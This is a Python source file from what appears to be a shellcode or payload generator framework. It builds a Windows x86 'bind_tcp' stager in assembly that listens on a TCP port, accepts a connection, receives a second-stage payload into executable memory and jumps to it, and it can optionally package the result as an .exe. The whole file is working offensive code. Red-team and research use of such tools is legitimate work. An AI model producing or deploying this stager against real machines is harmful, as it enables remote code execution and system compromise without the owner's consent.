
from keystone import *  # code assembler
from payloads.lib.get_api_shellcode import get_api_shellcode
from payloads.lib.exefile import exefile
import struct
import socket

HOST="127.0.0.1"    # Default Host Address
PORT=4444           # Default Port Number
FORMAT="raw"        # Default Format

class bind_tcp(object):
    def __init__(self) -> None:
        self.name = type(self).__name__
        self.platform = "windows"
        self.arch = "x86"
        self.sctype = "stager"
        self.description = "TCP connection to the target machine."
        # Add your extra configuration here
        

    def build_shellcode(self):
        mz = exefile().mz_pe_header
        gas = get_api_shellcode()
        gas_sc, cnt = gas.assemble()

        port_word = PORT.to_bytes((PORT.bit_length() + 7) // 8, 'little')
        #-----------------------
        btcp='''
                pop ebp
                push 00003233h                  ;Push '23' to the stack
                push 5F327377h                  ;Push '_2sw' to the stack
                push esp                        ;to form 'ws2_32' string in stack
                push 0726774Ch                  ;hash("kernel32.dll", "LoadLibraryA")
                call ebp                        ;LoadLibraryA("ws2_32")

                mov eax, 190h
                sub esp, eax
                push esp
                push eax
                push 6B8029h                    ;hash("ws2_32.dll", "WSAStartup")
                call ebp
                push 0Bh                        
                pop ecx

            set_stack:
                push eax
                loop set_stack

                push 1
                push 2
                push 0E0DF0FEAh                 ;hash("ws2_32.dll", "WSASocketA")
                call ebp
                xchg eax, edi
                push {0}0002h                   ;port = 0x115C -> 4444
                                                ;af = 0x02 -> AF_INET
                mov esi, esp
                push 10h
                push esi
                push edi
                push 6737DBC2h                  ;hash("ws2_32.dll", "bind")
                call ebp
                test eax, eax
                jnz exit_code
                push edi
                push 0FF38E9B7h                 ;hash("ws2_32.dll", "listen")
                call ebp
                push edi
                push 0E13BEC74h                 ;hash("ws2_32.dll", "accept")
                call ebp
                push edi
                xchg eax, edi
                push 614D6E75h                  ;hash("ws2_32.dll", "closesocket")
                call ebp
                push 0
                push 4
                push esi
                push edi
                push 5FC8D902h                  ;hash("ws2_32.dll", "recv")
                call ebp
                cmp eax, 0
                jle exit_code
                mov esi, [esi]
                push 40h
                push 1000h
                push ecx
                push 0
                push 0E553A458h                 ;hash("kernel32.dll", "VirtualAlloc")
                call ebp
                xchg ebx, eax
                push ebx

            recv_data:
                push 0
                push esi
                push ebx
                push edi
                push 5FC8D902h                  ;hash("ws2_32.dll", "recv")
                call ebp
                cmp eax, 0
                jle exit_code
                add ebx, eax
                sub esi, eax
                jnz recv_data
                ret

            exit_code:
                mov ebx, 056A2B5F0h             ;hash("kernel32.dll", "ExitProcess")
                push 0
                push ebx
                call ebp
        '''.format(port_word.hex())
        btcp = btcp.split("\n")
        o = []
        for d in btcp:
            if len(d) <= 0:
                continue
            s = d.find(";")
            if s < 0:
                s=0
                o.append(d[s:])
            else:
                o.append(d.replace(d[s:], ""))
        btcp = "\n".join(o)
        # Assemble        
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        btcp_enc, cnt = ks.asm(btcp)
        asm = bytes(gas_sc) + bytes(btcp_enc)
        #-----------------------
        # The MZHeader that was used has 1 section
        # the section has FileAlignment of 0x200 bytes 
        # Pad with zeroes for file alignment
        # For Windows Executable
        if FORMAT.upper() == "EXE":
            asmlen = len(asm)
            zpad = 512 - asmlen
            zpad = [0 for n in range(zpad)]
            asm += bytes(zpad)
            asm = mz + asm

        return asm, len(asm)

